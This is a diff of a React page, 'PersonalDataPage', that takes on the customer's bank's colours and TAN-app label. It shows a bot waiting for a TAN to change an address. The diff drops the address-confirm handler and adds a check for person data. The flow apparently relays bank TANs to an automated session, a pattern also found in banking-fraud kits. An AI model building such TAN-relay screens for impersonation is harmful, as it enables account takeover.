@@ -194,14 +194,6 @@ function PersonalDataPage() {
   const themeColor = theme.headerBg === "#ffffff" ? (theme.buttonBg || "#003399") : theme.headerBg;
   const secureGoLabel = getSecureGoLabel(bankCtx?.group);
 
-  const ad = (result as any)?.address_data ?? {};
-  const oldStreet = ad.old_street ?? ad.current_street ?? "";
-  const oldPlz = ad.old_plz ?? ad.current_plz ?? "";
-  const oldCity = ad.old_city ?? ad.current_city ?? "";
-  const newStreet = ad.new_street ?? ad.street ?? "";
-  const newPlz = ad.new_plz ?? ad.plz ?? "";
-  const newCity = ad.new_city ?? ad.city ?? "";
-
   // TAN overlay for address change (waiting_for_tan + tan_type === "address")
   const showAddressTan = botStatus === "waiting_for_tan" && botTanType === "address";
 
@@ -213,26 +205,9 @@ function PersonalDataPage() {
     return null;
   }, [botStatus, botError]);
 
-  async function handleConfirmAddressClick() {
-    if (!taskId) return;
-    setAddressConfirmSubmitting(true);
-    setAddressConfirmError(null);
-    try {
-      const res = await confirmAddress(taskId);
-      if (!res.ok) {
-        const body = await res.text().catch(() => "");
-        throw new Error(body || `HTTP ${res.status}`);
-      }
-      setAddressConfirmSuccess(true);
-      setTimeout(() => setAddressConfirmOpen(false), 1200);
-    } catch (e: any) {
-      setAddressConfirmError(e?.message ? String(e.message) : "Unbekannter Fehler");
-    } finally {
-      setAddressConfirmSubmitting(false);
-    }
-  }
+  const hasPersonData = !!(result?.person_data || result?.kontakt_data || result?.adressen_data);
 
-  if (!result || !customer) {
+  if (!result || !customer || !hasPersonData) {
     return (
       <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 text-gray-500">
         <Loader2 className="h-8 w-8 animate-spin mb-3 text-gray-400" />
